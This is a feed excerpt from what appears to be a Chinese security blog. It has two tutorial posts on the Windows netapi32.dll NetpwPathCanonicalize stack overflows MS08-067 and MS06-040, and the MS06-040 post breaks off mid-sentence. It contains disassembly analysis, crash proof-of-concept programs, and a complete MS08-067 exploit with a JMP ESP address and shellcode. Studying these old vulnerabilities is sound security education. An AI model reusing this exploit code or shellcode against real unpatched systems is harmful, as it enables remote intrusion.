class="line">    HMODULE handle = LoadLibrary(<span class="string">&quot;.\\netapi32.dll&quot;</span>);</span><br><span class="line">    MYPROC Trigger = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == handle)</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to load library!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(handle, <span class="string">&quot;NetpwPathCanonicalize&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == Trigger)</span><br><span class="line">    &#123;</span><br><span class="line">        FreeLibrary(handle);</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to get api address!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    wcscpy(path, <span class="string">L&quot;\\aaa\\..\\..\\bbbb&quot;</span>);</span><br><span class="line">    can_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    type = <span class="number">1000</span>;</span><br><span class="line">    wprintf(<span class="string">L&quot;BEFORE: %s\n&quot;</span>, path);</span><br><span class="line">    retval = (Trigger)(path, can_path, <span class="number">1000</span>, <span class="literal">NULL</span>, &amp;type, <span class="number">1</span>);</span><br><span class="line">    wprintf(<span class="string">L&quot;AFTER : %s\n&quot;</span>, can_path);</span><br><span class="line">    wprintf(<span class="string">L&quot;RETVAL: %s(0x%X)\n\n&quot;</span>, retval?<span class="string">L&quot;FAIL&quot;</span>:<span class="string">L&quot;SUCCESS&quot;</span>, retval);</span><br><span class="line">    FreeLibrary(handle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后运行结果：<br><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719223324355.png" alt="image-20220719223324355"></p><p>NetpwPathCanonicalize 函数正常返回，但是在输出的合并路径中，仍然存在一个经典目录 ‘ …\’，此时，我们可以结合静态分析，探究一下原因。以下是去除 ‘ …\’ 的相关汇编代码，变量 p1、 p2、p3 的定义请参看图 26.4.5。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA2BD @@period_found:</span><br><span class="line">5FDDA2BD lea eax, [esi-2] ; esi 为当前指针 p1，此时 p1 指向‘.’</span><br><span class="line">5FDDA2C0 cmp ebx, eax ; ebx 始终指向最新的‘\’，即 p2</span><br><span class="line">5FDDA2C2 jnz @@period_after_nonslash</span><br><span class="line">; 判断是否是经典目录：‘\.’或‘\..’</span><br><span class="line">5FDDA2C8 @@period_after_slash:</span><br><span class="line">5FDDA2C8 lea eax, [esi+2] ; eax 指向下一字符</span><br><span class="line">5FDDA2CB mov dx, [eax]</span><br><span class="line">5FDDA2CE cmp dx, &#x27;.&#x27; ; 是否‘\..’</span><br><span class="line">5FDDA2D2 jnz @@nonperiod_after_period</span><br><span class="line">5FDDA2D8 lea eax, [esi+4] ; eax 指向下两个字符</span><br><span class="line">5FDDA2DB mov bx, [eax]</span><br><span class="line">5FDDA2DE cmp bx, &#x27;\&#x27; ; 是否‘/../’</span><br><span class="line">5FDDA2E2 jz short @@skip_spps_by_copy</span><br><span class="line">5FDDA2E4 test bx, bx</span><br><span class="line">5FDDA2E7 jnz short @@move_forward</span><br><span class="line">5FDDA2E9 @@skip_spps_by_copy:</span><br><span class="line">5FDDA2E9 test edi, edi ; edi 指向 p2 之前的‘\’，即 p3</span><br><span class="line">5FDDA2EB jz @@exit_fail</span><br><span class="line">5FDDA2F1 push eax</span><br><span class="line">5FDDA2F2 push edi</span><br><span class="line">5FDDA2F3 call ds:__imp_wcscpy ; 移经操作： wcscpy(p3, p1)</span><br><span class="line">5FDDA2F9 test bx, bx</span><br><span class="line">5FDDA2FC pop ecx</span><br><span class="line">5FDDA2FD pop ecx</span><br><span class="line">5FDDA2FE jnz @@update_current_slash_after_copy</span><br><span class="line">…</span><br><span class="line">5FDE87F8 @@update_current_slash_after_copy:</span><br><span class="line">5FDE87F8 mov [ebp+current_slash], edi ; p2 &lt;= p3</span><br><span class="line">5FDE87FB mov esi, edi ; p1 &lt;= p3</span><br><span class="line">5FDE87FD lea eax, [edi-2] ; eax &lt;= p3-2，作为向前搜索‘/’</span><br><span class="line">                                ; 的初始指针，但是这里直接将指针</span><br><span class="line">                                ; 减 2，而没有做边界检查，这是导致</span><br><span class="line">                                ; 溢出的根本原因！</span><br><span class="line">5FDE8800 jmp short @@check_previous_slash_after_copy</span><br><span class="line">5FDE8802 @@loop_search_previous_slash:</span><br><span class="line">5FDE8802 cmp eax, [ebp+arg_Path] ; 这里的边界检查已无济于事，因为</span><br><span class="line">                                ; 在 0x5FDE87FD 处 eax 已经越界！</span><br><span class="line">                                ; 注： arg_Path 就是 Buff_OF</span><br><span class="line">5FDE8805 jz short @@previous_slash_found_after_copy</span><br><span class="line">5FDE8807 dec eax</span><br><span class="line">5FDE8808 dec eax</span><br><span class="line">5FDE8809 @@check_previous_slash_after_copy:</span><br><span class="line">5FDE8809 cmp word ptr [eax], &#x27;\&#x27;</span><br><span class="line">5FDE880D jnz short @@loop_search_previous_slash</span><br><span class="line">5FDE880F @@previous_slash_found_after_copy:</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到，位于 0x5FDDA2F3 处 wcscpy 函数运行后，完成了一次“移经”操作。接着代码 0x5FDE87F8 至 0x5FDE87FD 更新相关指针。位于 0x5FDE8800 至 0x5FDE880D 的循环代码用于向前搜索隔离字符指针 p3，<strong>尽管在循环过程中，代码有做边界检查，但是在循环初始化时却没有（见 0x5FDE87FD），而直接将指针初值 EDI 减 2</strong>；一旦初始化越界，循环过程中的边界检查将失效，因为指针 EAX 永远小于 Buff_OF 的起始字符地址，而循环退出的唯一条件是在低地址空间中再次找到隔离字符‘ \’。</p><p>调试到前向搜索越界时的状态。Buff_OF 位于 0x12F6C0，但是前向搜索的指针 EAX 已经被初始化为 0x12F6BE，小于 Buff_OF 了，我们不妨称这个指针为 previous_slash。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719231639738.png" alt="image-20220719231639738"></p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220719232209182.png" alt="image-20220719232209182"></p><p>由于 previous_slash (=EAX) 远小于 ESP，当再次调用 wcscpy 进行字符复制时，如果复制通过精心设计， wcscpy 函数的栈帧和返回地址将被覆盖修改，也就是说当 wcscpy 退出时，溢出会被成功利用。</p><blockquote><p>提示：尽管微软在 Windows XP SP2 及之后的操作系统中引入了 security cookie 机制防止缓冲区溢出，但是 wcscpy 函数依然没有并没有采用该机制，因此 MS08-067 可以在多种操作系统上成功溢出。</p></blockquote><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220720080253266.png" alt="image-20220720080253266"></p><p>计算要覆盖到返回地址的字符长度，wcscpy 的返回地址位于 0x0012F684，prefix_slash 位于 0x0012F5A2 (EDI)。需要230个字符（0x0012F684 - 0x0012F5A2+0x4 = 0xe6）就能覆盖到返回地址了。</p><p>具备溢出功能的 POC 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(__stdcall *MYPROC)</span> <span class="params">(LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    WCHAR path[<span class="number">256</span>];</span><br><span class="line">    WCHAR can_path[<span class="number">256</span>];</span><br><span class="line">    DWORD type = <span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    HMODULE handle = LoadLibrary(<span class="string">&quot;.\\netapi32.dll&quot;</span>);</span><br><span class="line">    MYPROC Trigger = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == handle)</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to load library!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(handle, <span class="string">&quot;NetpwPathCanonicalize&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == Trigger)</span><br><span class="line">    &#123;</span><br><span class="line">        FreeLibrary(handle);</span><br><span class="line">        wprintf(<span class="string">L&quot;Fail to get api address!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    wcscpy(path, <span class="string">L&quot;\\aaa\\..\\..\\bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>);</span><br><span class="line">    can_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    type = <span class="number">1000</span>;</span><br><span class="line">    wprintf(<span class="string">L&quot;BEFORE: %s\n&quot;</span>, path);</span><br><span class="line">    retval = (Trigger)(path, can_path, <span class="number">1000</span>, <span class="literal">NULL</span>, &amp;type, <span class="number">1</span>);</span><br><span class="line">    wprintf(<span class="string">L&quot;AFTER : %s\n&quot;</span>, can_path);</span><br><span class="line">    wprintf(<span class="string">L&quot;RETVAL: %s(0x%X)\n\n&quot;</span>, retval?<span class="string">L&quot;FAIL&quot;</span>:<span class="string">L&quot;SUCCESS&quot;</span>, retval);</span><br><span class="line">    FreeLibrary(handle);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设计出最终的 exploit代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(__stdcall *MYPROC)</span> <span class="params">(LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// address of jmp esp</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JMP_ESP  <span class="string">&quot;\x0b\xe9\xe0\x5f\x00\x00&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//shellcode</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHELL_CODE \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x90\x90\x90\x90&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x00\x00&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    WCHAR path[<span class="number">256</span>];</span><br><span class="line">    WCHAR can_path[<span class="number">256</span>];</span><br><span class="line">    DWORD type = <span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    HMODULE handle = LoadLibrary(<span class="string">&quot;.\\netapi32.dll&quot;</span>);</span><br><span class="line">    MYPROC Trigger = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == handle)</span><br><span class="line">    &#123;</span><br><span class="line">wprintf(<span class="string">L&quot;Fail to load library!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(handle, <span class="string">&quot;NetpwPathCanonicalize&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == Trigger)</span><br><span class="line">    &#123;</span><br><span class="line">FreeLibrary(handle);</span><br><span class="line">wprintf(<span class="string">L&quot;Fail to get api address!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    wcscpy(path, <span class="string">L&quot;\\aaa\\..\\..\\bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>);</span><br><span class="line">    wcscat(path, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> *)JMP_ESP);</span><br><span class="line">    wcscat(path, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> *)SHELL_CODE);</span><br><span class="line">    can_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    type = <span class="number">1000</span>;</span><br><span class="line">    wprintf(<span class="string">L&quot;BEFORE: %s\n&quot;</span>, path);</span><br><span class="line">    retval = (Trigger)(path, can_path, <span class="number">1000</span>, <span class="literal">NULL</span>, &amp;type, <span class="number">1</span>);</span><br><span class="line">    wprintf(<span class="string">L&quot;AFTER : %s\n&quot;</span>, can_path);</span><br><span class="line">    wprintf(<span class="string">L&quot;RETVAL: %s(0x%X)\n\n&quot;</span>, retval?<span class="string">L&quot;FAIL&quot;</span>:<span class="string">L&quot;SUCCESS&quot;</span>, retval);</span><br><span class="line">    FreeLibrary(handle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/image-20220720105512544-16583052120081.png" alt="image-20220720105512544" style="zoom:67%;">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;ms08-067-简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ms08-067-简介&quot;&gt;&lt;/a&gt; MS08-067 简介&lt;/h1&gt;
&lt;p&gt;MS08-067 漏洞是由于 netapi32.dll 的导出函</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞" scheme="https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>RPC入侵：MS06-040</title>
    <link href="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/"/>
    <id>https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/</id>
    <published>2022-07-20T08:14:55.000Z</published>
    <updated>2022-08-01T11:19:57.752Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="rpc-漏洞"><a class="markdownIt-Anchor" href="#rpc-漏洞"></a> RPC 漏洞</h1><h2 id="rpc-漏洞简介"><a class="markdownIt-Anchor" href="#rpc-漏洞简介"></a> RPC 漏洞简介</h2><p>RPC 即 Remote Procedure Call，它是一种计算机进程间的通信方式。简单地说，RPC 就是让您在自己地程序中调用一个函数（可能需要很大地计算量），而这个函数在另外一个或多个远程机器上执行，执行完后将结果传回您的机器进行后续操作。</p><p>RPC漏洞，远程调用函数出现了问题，甚至有可被利用的安全漏洞。</p><h2 id="rpc编程简介"><a class="markdownIt-Anchor" href="#rpc编程简介"></a> RPC编程简介</h2><p>在 VC 中进行 RPC 调用的流程如下图所示。</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220713220518781.png" alt="image-20220713220518781"><p>使用 RPC 调用时首先应当定义远程进程的接口 IDL 文件。 IDL（ Interface Description Language）是专门用来定义接口的语言，在这个文件里我们要指定 RPC 的接口信息以及 interface 下的 function 信息，包括函数的声明，参数等。</p><p>微软的 IDL 叫做 MIDL， 是兼容 IDL 标准的。定义好的 IDL 文件接口经过微软的 MIDL 编译器编译后会生成 3 个文件，一个客户端 stub（有些文献把 stub 翻译成“插桩”或“码桩”），一个服务端 stub，还有一个 RPC 调用的头文件。其中 stub 负责 RPC 调用过程中所有的网络操作细节。</p><p>在本章中将会用到 MS06-040 所需的接口文件，您可在看雪相关板块中下载附件。用 MIDL 编译接口文件rpc_exploit_040.acf 和 rpc_exploit_040.idl，得到 stub 文件和头文件。MIDL 编译器在 VC6.0 的组件里，可以在命令行下使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">midl /acf rpc_exploit_040.acf rpc_exploit_040.idl</span><br></pre></td></tr></table></figure><p>编译成功后，会在当前路径生成 3 个文件：<br>（ 1） rpc_exploit_040_s.c RPC 服务端 stub（桩）<br>（ 2） rpc_exploit_040_c.c R PC 客户端 stub（桩）<br>（ 3） rpc_exploit_040.h RPC 头文件</p><p>把两个 stub 添加进工程， include 头文件，和调用远程函数的程序一起 link，您就可以试着<br>去调用远程主机上的函数了。</p><h1 id="ms06-040"><a class="markdownIt-Anchor" href="#ms06-040"></a> MS06-040</h1><h2 id="ms06-040-简介"><a class="markdownIt-Anchor" href="#ms06-040-简介"></a> MS06-040 简介</h2><p>MS06-040 是这个漏洞的微软编号，其 CVE 编号为 CVE-2006-3439，对应补丁号为KB921883。</p><p>几乎所有使用 socket 网络的程序都会加载负责网络操作的 netapi32.dll。 MS06-040 指的就是这个动态链接库中的导出函数 NetpwPathCanonicalize() 中存在的缓冲溢出缺陷，而NetpwPathCanonicalize() 函数又可以被 RPC 远程调用，所以才会有这么大的危害。</p><h3 id="动态调试"><a class="markdownIt-Anchor" href="#动态调试"></a> 动态调试</h3><p>NetpwPathCanonicalize()是 netapi32.dll 的一个导出函数，用于格式化网络路径字符串，它的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">NetpwPathCanonicalize</span> <span class="params">(</span></span><br><span class="line"><span class="params">uint16      path[ ],            <span class="comment">//[in]      path name</span></span></span><br><span class="line"><span class="params">uint8       can_path[ ],        <span class="comment">//[out]     canonicalizedpath</span></span></span><br><span class="line"><span class="params">uint32      maxbuf,             <span class="comment">//[in]      max size of can_path</span></span></span><br><span class="line"><span class="params">uint16      prefix[ ],          <span class="comment">//[in]      path prefix</span></span></span><br><span class="line"><span class="params">uint32*     pathtype,           <span class="comment">//[in out]  path type</span></span></span><br><span class="line"><span class="params">uint32      pathflags           <span class="comment">//[in]      path flags, 0 or 1</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>这是一个 Unicode 字符串处理函数，大体功能是：如果 prefix 串非空，将 prefix 串与 path串用‘ \’相连，并复制到输出串 can_path 中，输出串的容量为 maxbuf 字节大小：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prefix ＋ ‘\’ ＋ path =&gt; can_path [max_buf]</span><br></pre></td></tr></table></figure><p>在路径合并过程中，函数会做各种检查，如 prefix 或 path 长度是否越界、是否符合路径规范，或 can_path 的容量是否够大等等，否则函数将退出，并返回相应的错误号，例如，ERROR_INVALID_NAME （ 0x7B ）， ERROR_INVALID_PARAMETER （ 0x135 ），NERR_BufTooSmall（ 0x84B）等；函数成功则返回 0，并对 pathtype 进行更新。</p><p>首先在本地直接装载有漏洞的动态链接库，并调用这个函数，等到弄清楚栈中的细节之后，再实践远程利用。</p><p>触发这个漏洞的 POC 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> path[<span class="number">0x320</span>];</span><br><span class="line">    <span class="type">char</span> can_path[<span class="number">0x440</span>];</span><br><span class="line">    <span class="type">int</span> maxbuf = <span class="number">0x440</span>;</span><br><span class="line">    <span class="type">char</span> prefix[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">long</span> pathtype = <span class="number">44</span>;</span><br><span class="line"> </span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[] = <span class="string">&quot;./netapi32.dll&quot;</span>;</span><br><span class="line">    <span class="type">char</span> VulFunc[] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(LibHandle, VulFunc);</span><br><span class="line">    <span class="built_in">memset</span>(path, <span class="number">0</span>, <span class="keyword">sizeof</span>(path));</span><br><span class="line">    <span class="built_in">memset</span>(path, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(path) - <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">memset</span>(prefix, <span class="number">0</span>, <span class="keyword">sizeof</span>(prefix));</span><br><span class="line">    <span class="built_in">memset</span>(prefix, <span class="string">&#x27;b&#x27;</span>, <span class="keyword">sizeof</span>(prefix) - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    (Trigger)(path, can_path, maxbuf, prefix, &amp;pathtype, <span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的功能是装载存在漏洞的 netapi32.dll，并调用其导出函数 NetpwPathCanonicalize。在函数调用时我们将 path 和 prefix 设置成很长的字符串，用以触发栈溢出。注意这个字符串以两个字节的 null 结束，这是因为 NetpwPathCanonicalize 将按照 Unicode 来处理字符串。</p><p>memset()函数，将缓冲区设置为指定字符。</p><table><thead><tr><th></th><th>推荐的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>winXP SP3</td><td>本地调试与操作系统版本无关</td></tr><tr><td>漏洞文件</td><td>netapi32.dll</td><td>在没有 patch 过 KB921883 的 Window 2000 操作系统中，该文件位于 c:\winnt\system32 下 ； 若操作系统已经被 patch ， 可 以在 c:\winnt$NtUninstallKB921883$下找到该文件；您也可以在本章的附带资料中找到这个动态链接库文件</td></tr><tr><td>编译器</td><td>VC++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>Release 版本</td><td>debug 版本在调试时可能会有细节上的差异</td></tr></tbody></table><blockquote><p>注意： 需要未打补丁的netapi32.dll，Windows 2000在C:\WINNT\system32目录下能找到，或者用以下提供的dll，但远程exploit必须要带有未打补丁dll的系统。本实验指导的调试基于使用的漏洞文件大小为 309008 字节，您可以在本章附带的电子资料中找到这个文件，请您在编译运行 POC 